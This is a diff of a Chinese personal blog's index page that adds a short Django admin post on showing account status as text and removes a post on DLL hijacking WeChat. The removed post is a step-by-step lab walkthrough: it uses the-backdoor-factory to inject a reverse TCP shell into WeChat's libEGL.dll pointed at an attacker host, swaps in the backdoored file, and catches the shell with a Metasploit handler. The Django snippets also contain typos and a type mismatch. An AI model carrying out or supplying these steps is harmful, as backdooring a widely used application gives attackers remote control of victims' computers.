@@ -154,6 +154,91 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/25/django-remodel/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="沫">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="沫的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/25/django-remodel/" class="post-title-link" itemprop="url">Django后台自定义数据修改</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-03-25 21:07:00 / 修改时间：21:27:43" itemprop="dateCreated datePublished" datetime="2020-03-25T21:07:00+08:00">2020-03-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%BC%80%E5%8F%91/" itemprop="url" rel="index">
+                    <span itemprop="name">web开发</span>
+                  </a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%BC%80%E5%8F%91/Django/" itemprop="url" rel="index">
+                    <span itemprop="name">Django</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="Django后台简介"><a href="#Django后台简介" class="headerlink" title="Django后台简介"></a>Django后台简介</h4><p>django默认后台admin它提供十分强大的数据处理，让我们可以在不需要写前端的情况下，编写一个后台，但是数据库的有写数据我们自己知道代表什么意思但是不代表所有人都知道，比如账号的状态，我们一般都是数字代替，但是我们想要让他以文字的方法进行表达，此篇文章就围绕这个进行说明。</p>
+<h4 id="定义一个类进行实际操作"><a href="#定义一个类进行实际操作" class="headerlink" title="定义一个类进行实际操作"></a>定义一个类进行实际操作</h4><p>下面这个类的大概意思就是创建了一个account_number字段password字段和status字段,表名为users，进行数据库迁移后就在mysql可以看到了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Users</span><span class="params">(model.Model)</span>:</span></span><br><span class="line">    user_status = (</span><br><span class="line">        (<span class="number">0</span>, <span class="string">'未实名'</span>),</span><br><span class="line">        (<span class="number">1</span>, <span class="string">'已实名'</span>)</span><br><span class="line">    )</span><br><span class="line">	account_number = model.CharField(max_length=<span class="number">128</span>,null=<span class="literal">False</span>)</span><br><span class="line">    password = model.CharField(max_length=<span class="number">128</span>,null=<span class="literal">False</span>)</span><br><span class="line">    status = models.SmallIntegerField(choices=user_status, default=<span class="number">0</span>, verbose_name=<span class="string">'账号状态'</span>)</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">meta</span><span class="params">()</span>:</span></span><br><span class="line">    	db_table = <span class="string">'users'</span></span><br></pre></td></tr></table></figure>
+<p>迁移命令</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 manage makemigration </span><br><span class="line">python3 manage migarte</span><br></pre></td></tr></table></figure>
+<h4 id="改变正常返回的结果"><a href="#改变正常返回的结果" class="headerlink" title="改变正常返回的结果"></a>改变正常返回的结果</h4><p>正常情况下使用枚举我们写入数字就行了，但是问题来了，我们后台通过admin的display现实也是1，2，3，但是我们想让他显示成中文，更加明确，这个时候我们只需要写一个方法进行修改就行了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Users</span><span class="params">(model.Model)</span>:</span></span><br><span class="line">    user_status = (</span><br><span class="line">        (<span class="number">0</span>, <span class="string">'未实名'</span>),</span><br><span class="line">        (<span class="number">1</span>, <span class="string">'已实名'</span>)</span><br><span class="line">    )</span><br><span class="line">	account_number = model.CharField(max_length=<span class="number">128</span>,null=<span class="literal">False</span>)</span><br><span class="line">    password = model.CharField(max_length=<span class="number">128</span>,null=<span class="literal">False</span>)</span><br><span class="line">    status = models.SmallIntegerField(choices=user_status, default=<span class="number">0</span>, verbose_name=<span class="string">'账号状态'</span>)</span><br><span class="line">     <span class="comment"># # 重写status这个值，显示账号状态</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">restatus</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.status == <span class="string">'0'</span>:</span><br><span class="line">            <span class="keyword">return</span> format_html(<span class="string">'&lt;span style="color:#f00;"&gt;未实名&lt;/span&gt;'</span>)</span><br><span class="line">        <span class="keyword">elif</span> self.status == <span class="string">'1'</span>:</span><br><span class="line">            <span class="keyword">return</span> format_html(<span class="string">'&lt;span style="color:#f00;"&gt;已实名&lt;/span&gt;'</span>)</span><br><span class="line">    restatus.short_description = <span class="string">u'账号状态'</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">meta</span><span class="params">()</span>:</span></span><br><span class="line">    	db_table = <span class="string">'users'</span></span><br></pre></td></tr></table></figure>
+<p>然后在admin文件里面的display元组里面写上restatus这个名字就行了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ControlUsers</span><span class="params">(admin.ModelAdmin)</span>:</span></span><br><span class="line">    <span class="comment"># 对后台需要展示的字段值进行写入</span></span><br><span class="line">    list_display = (<span class="string">'username'</span>, <span class="string">'password'</span>,<span class="string">'restatus'</span>)</span><br><span class="line">admin.site.regitset(Users,ControlUsers)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/20/python%E9%AB%98%E7%BA%A7%E7%94%9F%E6%88%90%E5%99%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -920,109 +1005,6 @@ for 循环迭代结束不会报StopIteration异常是因为内部处理过来，
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/dll-hijack/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="沫">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="沫的博客">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/02/13/dll-hijack/" class="post-title-link" itemprop="url">DLL劫持微信反弹shell</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-02-13 17:17:00 / 修改时间：18:05:22" itemprop="dateCreated datePublished" datetime="2020-02-13T17:17:00+08:00">2020-02-13</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>受害者主机 windows10</p>
-<p>攻击者主机 kali ip地址：192.168.0.111</p>
-<p>攻击工具 超强任务管理器(Process Explorer) <span style="color:red">windows工具</span></p>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用Process Explorer去寻找微信的dll加载文件，需要先打开微信，然后光标点击微信使用ctrl+f去进行搜索目标文件<span style="color:red">libeay32</span></p>
-<p><span style="color:blue">下面是执行操作图，然后双击文件就可以找到目标文件路径</span><br><img src="/images/pasted-59.png" alt="upload successful"></p>
-<p><span style="color:blue">打开目标文件夹会发现这2个dll文件，都是可以进行dll注入亲测</span></p>
-<p><img src="/images/pasted-60.png" alt="upload successful"><br><span style="color:blue">我的kali虚拟机无法进行粘贴复制所以只能使用scp命令进行上传</span></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp ./libEGL.dll root@192.168.0.111:/the-backdoor-factory-master</span><br></pre></td></tr></table></figure>
-<p><img src="/images/pasted-61.png" alt="upload successful"></p>
-<h3 id="开始生成木马文件"><a href="#开始生成木马文件" class="headerlink" title="开始生成木马文件"></a>开始生成木马文件</h3><p>打开kali进入到/the-backdoor-factory-master文件夹里执行./backdoor.py -f libEGL.dll 对文件进行可利用payload检测</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./backdoor.py -f libEGL.dll</span><br></pre></td></tr></table></figure>
-<p><span style="color:blue">下图是我可以利用的payload其中包含了 reverse_shell_tcp_inline 我们可以利用这个payload进行shell反弹</span><br><img src="/images/pasted-62.png" alt="upload successful"><br>生成木马文件,-f参数是指我们需要把那个文件进行生成， -s 参数是我们需要加入的payload文件名 -P 是端口 -H是主机地址，因为我们反弹到kali所以填写kali的主机地址就行了 注意大小写</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./backdoor.py -f libEGL.dll -s reverse_shell_tcp_inline -P 5555 -H 192.168.0.111</span><br></pre></td></tr></table></figure>
-<p><span style="color:blue">他是选择让我们用一个身份证进行会话，我这里只有一个所以选择1</span><br><img src="/images/pasted-63.png" alt="upload successful"><br><span style="color:blue">生成成功后他会创建一个backdoored文件夹这里面是存放的我们生成好的木马</span></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@mo:/the-backdoor-factory-master<span class="comment"># cd backdoored/</span></span><br><span class="line">root@mo:/the-backdoor-factory-master/backdoored<span class="comment"># ls</span></span><br><span class="line">libEGL.dll</span><br></pre></td></tr></table></figure>
-<p><span style="color:blue">存放已经生成好的木马</span><br><img src="/images/pasted-64.png" alt="upload successful"><br>接下来只需要把木马拿回到windows，并且替换掉那个文件夹的原文件</p>
-<p><span style="color:blue">因为我没办法复制粘贴所以只能scp进行传输，把这个文件替换win这边就算配置好了</span><br><img src="/images/pasted-65.png" alt="upload successful"></p>
-<h3 id="msf获取shell反弹"><a href="#msf获取shell反弹" class="headerlink" title="msf获取shell反弹"></a>msf获取shell反弹</h3><p>加载插件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
-<p><img src="/images/pasted-66.png" alt="upload successful"><br>选择我们刚刚写入的payload</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/shell_reverse_tcp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/pasted-67.png" alt="upload successful"><br>配置ip地址</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> lhost 192.168.0.111</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/pasted-68.png" alt="upload successful"><br>配置监听端口</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> lport 5555</span><br></pre></td></tr></table></figure>
-<p><img src="/images/pasted-69.png" alt="upload successful"><br>检查总体配置</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
-<p><img src="/images/pasted-75.png" alt="upload successful"><br>开始监听</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
-<p>这个时候已经在监听，只需要打开微信就可以获取到shell，不需要登录<br><img src="/images/pasted-76.png" alt="upload successful"></p>
-<p>获取到的shell<br><img src="/images/pasted-77.png" alt="upload successful"></p>
-<h3 id="攻击防护"><a href="#攻击防护" class="headerlink" title="攻击防护"></a>攻击防护</h3><p>不要去任何不信任或没授权的应用商店去下载软件。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1093,7 +1075,7 @@ for 循环迭代结束不会报StopIteration异常是因为内部处理过来，
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">17</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
